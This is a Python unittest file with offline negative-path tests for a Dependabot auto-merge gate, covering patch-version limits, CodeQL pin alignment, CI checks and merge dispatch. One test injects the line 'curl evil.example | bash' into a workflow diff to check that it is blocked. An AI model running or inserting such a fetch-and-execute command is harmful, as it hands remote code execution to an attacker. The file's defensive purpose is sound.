"""Offline negative-path tests for the trusted Dependabot merge gate."""
import unittest
from unittest.mock import patch

import dependabot_automerge as m


class DummyAPI:
    repo = 'Railsimulatornet/autoheal'

    def __init__(self):
        self.files = {
            '.github/workflows/codeql.yml': (
                'uses: github/codeql-action/init@9b3254085494b55a0f7c4c2b3d2d52cc712ce370\n'
                'uses: github/codeql-action/analyze@9b3254085494b55a0f7c4c2b3d2d52cc712ce370\n'),
            '.github/workflows/security-scan.yml': (
                'uses: github/codeql-action/upload-sarif@v4.39.1\n'),
            '.github/workflows/docker-publish.yml': 'name: Docker Image\n',
        }
        self.revisions = {}
        self.data = {}
        self.lists = {}
        self.calls = []

    def file(self, path, ref):
        return self.revisions[(path, ref)] if (path, ref) in self.revisions else self.files[path]

    def get(self, path):
        self.calls.append(('GET', path))
        if path.startswith('/repos/github/codeql-action/git/ref/tags/'):
            return {'object': {'type': 'tag', 'sha': 'tagsha-' + path.rsplit('/', 1)[-1]}}
        if path.startswith('/repos/github/codeql-action/git/tags/'):
            return {'object': {'type': 'commit', 'sha': ('8' * 40 if path.endswith('v4.39.2') else '9b3254085494b55a0f7c4c2b3d2d52cc712ce370')}}
        return self.data[path]

    def pages(self, path, key=None):
        self.calls.append(('PAGES', path))
        return self.lists[path]

    def request(self, path, method='GET', payload=None):
        self.calls.append((method, path, payload))
        if method == 'PUT':
            self.data[f'/repos/{self.repo}/git/ref/heads/main'] = {'object': {'sha': 'c' * 40}}
        return {'merged': True, 'sha': 'c' * 40}


def action_diff(before='v4.39.0', after='v4.39.1', kind='upload-sarif', path='.github/workflows/security-scan.yml'):
    return [{'filename': path, 'status': 'modified',
             'patch': '@@ -1 +1 @@\n'
                      f'-        uses: github/codeql-action/{kind}@{before}\n'
                      f'+        uses: github/codeql-action/{kind}@{after}'}]


def sample_api(require_pipeline=False):
    a = DummyAPI()
    a.revisions[('.github/workflows/security-scan.yml', 'b' * 40)] = 'uses: github/codeql-action/upload-sarif@v4.39.0\n'
    head = 'h' * 40
    name = 'Railsimulatornet/autoheal'
    a.lists[f'/repos/{name}/actions/runs?event=pull_request&head_sha={head}'] = [
        {'status': 'completed', 'conclusion': 'success', 'name': 'CodeQL'}]
    expected = ('CodeQL', 'Analyze (actions)', 'Analyze (python)')
    a.lists[f'/repos/{name}/commits/{head}/check-runs'] = [
        {'status': 'completed', 'conclusion': 'success', 'name': n} for n in expected]
    a.lists[f'/repos/{name}/pulls/7/files'] = action_diff()
    a.data[f'/repos/{name}/commits/{head}/status'] = {'sha': head, 'total_count': 0, 'statuses': []}
    a.data[f'/repos/{name}/commits/{head}/status?per_page=100'] = a.data[f'/repos/{name}/commits/{head}/status']
    a.data[f'/repos/{name}/git/ref/heads/main'] = {'object': {'sha': 'b' * 40}}
    a.data[f'/repos/{name}/compare/{"b" * 40}...{head}'] = {'behind_by': 0, 'ahead_by': 1}
    a.data[f'/repos/{name}/pulls/7'] = {
        'state': 'open', 'draft': False,
        'user': {'login': 'dependabot[bot]'},
        'base': {'ref': 'main', 'sha': 'b' * 40},
        'head': {'sha': head, 'ref': 'dependabot/github_actions/actions-patch-123',
                 'repo': {'full_name': name}},
        'labels': [{'name': 'automerge:patch:github-actions'}],
        'mergeable': True, 'mergeable_state': 'clean',
    }
    if require_pipeline:
        a.lists[f'/repos/{name}/actions/runs?event=pull_request&head_sha={head}'].append(
            {'status': 'completed', 'conclusion': 'success', 'name': 'Docker Image'})
        a.lists[f'/repos/{name}/commits/{head}/check-runs'].extend(
            {'status': 'completed', 'conclusion': 'success', 'name': n}
            for n in ('metadata', 'security / security', 'validate'))
    return a, head


class PatchValidation(unittest.TestCase):
    def test_tags_patch_ok(self):
        self.assertTrue(m.check_codeql_patch(action_diff()))

    def test_sha_pin_patch_ok(self):
        old = '6' * 40
        new = '9' * 40
        self.assertFalse(m.check_codeql_patch(action_diff(old, new, 'init', '.github/workflows/codeql.yml')))

    def test_minor_update_blocked(self):
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(action_diff('v4.38.3', 'v4.39.1'))

    def test_major_update_blocked(self):
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(action_diff('v4.39.1', 'v5.0.0'))

    def test_injected_shell_blocked(self):
        files = action_diff()
        files[0]['patch'] += '\n+        run: curl evil.example | bash'
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_disguised_patch_prefix_is_not_skipped(self):
        files = action_diff()
        files[0]['patch'] += '\n+++  run: echo dangerous'
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_missing_diff_blocked(self):
        files = action_diff()
        files[0]['patch'] = None
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_other_action_blocked(self):
        files = action_diff()
        files[0]['patch'] = files[0]['patch'].replace('github/codeql-action/', 'actions/checkout@')
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(files)

    def test_filename_restriction(self):
        with self.assertRaises(m.Blocked):
            m.check_codeql_patch(action_diff(path='Dockerfile'))

    def test_generic_patches(self):
        cfg = m.CONFIG['autoheal']
        self.assertTrue(m.eligible_files('docker', [{'filename': 'Dockerfile', 'status': 'modified'}], cfg))
        with self.assertRaises(m.Blocked):
            m.eligible_files('docker', [{'filename': '.github/workflows/hack.yml', 'status': 'modified'}], cfg)

    def test_patch_label_required(self):
        with self.assertRaises(m.Blocked):
            m.patch_family({'labels': [{'name': 'dependencies'}]})
        with self.assertRaises(m.Blocked):
            m.patch_family({'labels': [{'name': 'automerge:patch:docker'},
                                            {'name': 'automerge:patch:pip'}]})


class Alignment(unittest.TestCase):
    def test_aligned_refs(self):
        m.enforce_codeql_alignment(DummyAPI(), 'head')

    def test_upload_out_of_sync(self):
        a = DummyAPI()
        a.files['.github/workflows/security-scan.yml'] = 'uses: github/codeql-action/upload-sarif@v4.39.2'
        with self.assertRaises(m.Blocked):
            m.enforce_codeql_alignment(a, 'head')

    def test_init_analyze_mismatch(self):
        a = DummyAPI()
        a.files['.github/workflows/codeql.yml'] = a.files['.github/workflows/codeql.yml'].replace(
            'analyze@9b3254085494b55a0f7c4c2b3d2d52cc712ce370', 'analyze@' + '8' * 40)
        with self.assertRaises(m.Blocked):
            m.enforce_codeql_alignment(a, 'head')


class CheckRuns(unittest.TestCase):
    def test_ci_passes(self):
        a, sha = sample_api()
        m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_trivy_neutral_blocks(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/commits/{sha}/check-runs'].append(
            {'name': 'Trivy', 'status': 'completed', 'conclusion': 'neutral'})
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_missing_codeql_blocks(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/commits/{sha}/check-runs'].pop()
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_missing_pipeline_blocks(self):
        a, sha = sample_api()
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], True)

    def test_failing_run_blocks(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/actions/runs?event=pull_request&head_sha={sha}'][0]['conclusion'] = 'failure'
        with self.assertRaises(m.Blocked):
            m.verify_checks(a, sha, m.CONFIG['autoheal'], False)

    def test_skipped_publication_is_expected(self):
        a, sha = sample_api()
        a.lists[f'/repos/{a.repo}/commits/{sha}/check-runs'].append(
            {'name': 'publish', 'status': 'completed', 'conclusion': 'skipped'})
        m.verify_checks(a, sha, m.CONFIG['autoheal'], False)


class Merging(unittest.TestCase):
    def test_actual_docker_patch_passes(self):
        a, sha = sample_api(require_pipeline=True)
        a.data[f'/repos/{a.repo}/pulls/7']['labels'] = [{'name': 'automerge:patch:docker'}]
        a.lists[f'/repos/{a.repo}/pulls/7/files'] = [{'filename': 'Dockerfile', 'status': 'modified'}]
        a.files['Dockerfile'] = 'FROM alpine:3.24.2\n'
        a.revisions[('Dockerfile', 'b' * 40)] = 'FROM alpine:3.24.1\n'
        self.assertEqual(m.verify_candidate(a, 7, m.CONFIG['autoheal']), (sha, 'docker', 'b' * 40))

    def test_stale_label_and_misleading_diff_cannot_authorize_nonpatch(self):
        for version in ('3.25.0', '4.0.0'):
            a, sha = sample_api(require_pipeline=True)
            a.data[f'/repos/{a.repo}/pulls/7']['labels'] = [{'name': 'automerge:patch:docker'}]
            a.lists[f'/repos/{a.repo}/pulls/7/files'] = [{
                'filename': 'Dockerfile', 'status': 'modified',
                'patch': '@@ -1 +1 @@\n-FROM alpine:3.24.1\n+FROM alpine:3.24.2'}]
            a.files['Dockerfile'] = 'FROM alpine:' + version + '\n'
            a.revisions[('Dockerfile', 'b' * 40)] = 'FROM alpine:3.24.1\n'
            with self.subTest(version=version), self.assertRaises(m.Blocked):
                m.merge_candidate(a, 7, m.CONFIG['autoheal'], False)
            self.assertFalse(any(call[0] == 'PUT' for call in a.calls))

    def test_expected_docker_pipeline_must_run_for_codeql_changes(self):
        a, sha = sample_api(require_pipeline=False)
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'])

    def test_codeql_path_filters_per_repository(self):
        self.assertTrue(m.CONFIG['autoheal']['codeql_requires_pipeline'])
        self.assertTrue(m.CONFIG['schulmanager-homework-watcher']['codeql_requires_pipeline'])
        self.assertTrue(m.CONFIG['UGREEN-NAS-Lyrics-Downloader']['codeql_requires_pipeline'])
        self.assertFalse(m.CONFIG['UGREEN-NAS-Syncthing-Reporter']['codeql_requires_pipeline'])

    def test_up_to_date_validates(self):
        a, sha = sample_api(require_pipeline=True)
        self.assertEqual(m.verify_candidate(a, 7, m.CONFIG['autoheal']), (sha, 'github-actions', 'b' * 40))

    def test_stale_branch_blocked(self):
        a, sha = sample_api(require_pipeline=True)
        a.data[f'/repos/{a.repo}/compare/{"b"*40}...{sha}']['behind_by'] = 1
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'])

    def test_stale_event_sha_blocked(self):
        a, sha = sample_api(require_pipeline=True)
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'], 'old-sha')

    def test_foreign_author_blocked(self):
        a, sha = sample_api(require_pipeline=True)
        a.data[f'/repos/{a.repo}/pulls/7']['user']['login'] = 'attacker'
        with self.assertRaises(m.Blocked):
            m.verify_candidate(a, 7, m.CONFIG['autoheal'])

    def test_dry_run_never_merges(self):
        a, sha = sample_api(require_pipeline=True)
        m.merge_candidate(a, 7, m.CONFIG['autoheal'], True)
        self.assertFalse(any(c[0] == 'PUT' for c in a.calls))

    def test_merge_and_dispatch_codeql(self):
        a, sha = sample_api(require_pipeline=True)
        m.merge_candidate(a, 7, m.CONFIG['autoheal'], False)
        self.assertIn(('POST', f'/repos/{a.repo}/actions/workflows/codeql.yml/dispatches', {'ref': 'main', 'inputs': {'expected_sha': 'c' * 40}}), a.calls)
        self.assertTrue(any(c[0] == 'PUT' for c in a.calls))

    def test_untrusted_workflow_event_ignored(self):
        a, _ = sample_api()
        nums, sha = m.choose_prs(a, {'event_type': 'workflow_run', 'workflow_run': {
            'event': 'pull_request', 'actor': {'login': 'attacker'},
            'head_sha': 'bad', 'pull_requests': [{'number': 7}]}})
        self.assertEqual(nums, [])



class CompleteEvidenceAndBoundDispatch(unittest.TestCase):
    def candidate(self):
        return sample_api(require_pipeline=True)

    def verify(self, api, head):
        m.verify_checks(api, head, m.CONFIG['autoheal'], True)

    def merge(self, api):
        m.merge_candidate(api, 7, m.CONFIG['autoheal'], False)

    def status_route(self, api, head):
        return f'/repos/{api.repo}/commits/{head}/status?per_page=100'

    def test_truncated_status_collection_cannot_authorize_merge(self):
        api, head = self.candidate()
        api.data[self.status_route(api, head)]['total_count'] = 31
        with self.assertRaises(m.Blocked):
            self.merge(api)
        self.assertFalse(any(call[0] == 'PUT' for call in api.calls))

    def test_status_collection_must_belong_to_verified_head(self):
        api, head = self.candidate()
        api.data[self.status_route(api, head)]['sha'] = 'e' * 40
        with self.assertRaises(m.Blocked):
            self.merge(api)
        self.assertFalse(any(call[0] == 'PUT' for call in api.calls))

    def test_failure_after_default_page_prevents_merge(self):
        api, head = self.candidate()
        route = self.status_route(api, head)
        states = [{'state': 'success'} for _ in range(30)] + [{'state': 'failure'}]
        api.data[route] = {'sha': head, 'total_count': 31, 'statuses': states}
        api.data[route.split('?')[0]] = {'sha': head, 'total_count': 31, 'statuses': states[:30]}
        with self.assertRaises(m.Blocked):
            self.merge(api)
        self.assertFalse(any(call[0] == 'PUT' for call in api.calls))

    def test_complete_large_success_collection_is_accepted(self):
        api, head = self.candidate()
        route = self.status_route(api, head)
        api.data[route].update(total_count=100, statuses=[{'state': 'success'} for _ in range(100)])
        self.verify(api, head)
        self.assertIn(('GET', route), api.calls)

    def test_malformed_merge_identity_never_dispatches(self):
        from unittest.mock import patch
        for merged in ('', 'main', None, 'A' * 40):
            api, head = self.candidate()
            with self.subTest(merged=merged), patch.object(api, 'request', return_value={'merged': True, 'sha': merged}):
                with self.assertRaises(RuntimeError):
                    self.merge(api)
            self.assertFalse(any(call[0] == 'POST' for call in api.calls))

    def test_main_advance_after_merge_never_dispatches(self):
        from unittest.mock import patch
        api, head = self.candidate()
        request = api.request
        def move_main(*args, **kwargs):
            result = request(*args, **kwargs)
            api.data[f'/repos/{api.repo}/git/ref/heads/main'] = {'object': {'sha': 'e' * 40}}
            return result
        with patch.object(api, 'request', side_effect=move_main), self.assertRaises(RuntimeError):
            self.merge(api)
        self.assertFalse(any(call[0] == 'POST' for call in api.calls))

    def test_dispatch_uses_confirmed_merge_not_pr_head(self):
        api, head = self.candidate()
        self.merge(api)
        writes = [call for call in api.calls if call[0] == 'POST']
        self.assertTrue(writes)
        self.assertTrue(all(call[2] == {'ref': 'main', 'inputs': {'expected_sha': 'c' * 40}}
                            for call in writes))
        self.assertNotEqual(head, 'c' * 40)

    def test_dispatch_guard_rejects_moved_or_malformed_source(self):
        from pathlib import Path
        import subprocess
        root = Path(__file__).resolve().parents[2]
        for workflow in ('codeql.yml', 'docker-publish.yml'):
            text = (root / '.github/workflows' / workflow).read_text()
            block = text.split('      - name: Verify requested source commit\n', 1)[1].split('        run: |\n', 1)[1]
            lines = []
            for line in block.splitlines():
                if line and not line.startswith('          '):
                    break
                lines.append(line[10:])
            script = '\n'.join(lines)
            for expected, actual, valid in (('c' * 40, 'c' * 40, True), ('', 'a' * 40, True),
                                            ('c' * 40, 'a' * 40, False), ('main', 'a' * 40, False)):
                with self.subTest(workflow=workflow, expected=expected, actual=actual):
                    result = subprocess.run(['/bin/bash', '-c', script],
                        env={'EXPECTED_SHA': expected, 'GITHUB_SHA': actual}, capture_output=True, timeout=5)
                    self.assertEqual(result.returncode == 0, valid)


    def test_runtime_patch_dispatches_pipeline_and_codeql_for_same_merge(self):
        api, head = self.candidate()
        api.data[f'/repos/{api.repo}/pulls/7']['labels'] = [{'name': 'automerge:patch:docker'}]
        api.lists[f'/repos/{api.repo}/pulls/7/files'] = [{'filename': 'Dockerfile', 'status': 'modified'}]
        api.files['Dockerfile'] = 'FROM alpine:3.24.2\n'
        api.revisions[('Dockerfile', 'b' * 40)] = 'FROM alpine:3.24.1\n'
        self.merge(api)
        writes = [call for call in api.calls if call[0] == 'POST']
        self.assertEqual(len(writes), 2)
        self.assertTrue(writes[0][1].endswith('/docker-publish.yml/dispatches'))
        self.assertTrue(writes[1][1].endswith('/codeql.yml/dispatches'))
        self.assertTrue(all(call[2] == {'ref': 'main', 'inputs': {'expected_sha': 'c' * 40}}
                            for call in writes))

    def test_base_advance_during_ci_cannot_authorize_merge(self):
        from unittest.mock import patch
        api, head = self.candidate()
        verify = m.verify_checks
        def move_base(*args, **kwargs):
            verify(*args, **kwargs)
            api.data[f'/repos/{api.repo}/git/ref/heads/main']['object']['sha'] = 'e' * 40
            api.data[f'/repos/{api.repo}/pulls/7']['base']['sha'] = 'e' * 40
        with patch.object(m, 'verify_checks', side_effect=move_base), self.assertRaises(m.Blocked):
            self.merge(api)
        self.assertFalse(any(call[0] == 'PUT' for call in api.calls))

    def test_school_runtime_dispatch_publishes_only_the_verified_pipeline(self):
        from unittest.mock import patch
        config = m.CONFIG['schulmanager-homework-watcher']
        self.assertTrue(config['dispatch_publish'])
        self.assertFalse(any(value.get('dispatch_publish', False) for name, value in m.CONFIG.items()
                             if name != 'schulmanager-homework-watcher'))
        for family in ('npm', 'github-actions'):
            api, head = self.candidate()
            # Classification has its own complete tests; exercise the real post-merge caller here.
            with self.subTest(family=family), patch.object(m, 'verify_candidate',
                    return_value=(head, family, 'b' * 40)):
                m.merge_candidate(api, 7, config, False)
            writes = [call for call in api.calls if call[0] == 'POST']
            if family == 'npm':
                self.assertEqual(len(writes), 2)
                self.assertTrue(writes[0][1].endswith('/security-scan.yml/dispatches'))
                self.assertEqual(writes[0][2]['inputs'], {'expected_sha': 'c' * 40, 'publish': True})
            else:
                self.assertEqual(len(writes), 1)
            self.assertTrue(writes[-1][1].endswith('/codeql.yml/dispatches'))
            self.assertEqual(writes[-1][2]['inputs'], {'expected_sha': 'c' * 40})

if __name__ == '__main__':
    unittest.main()

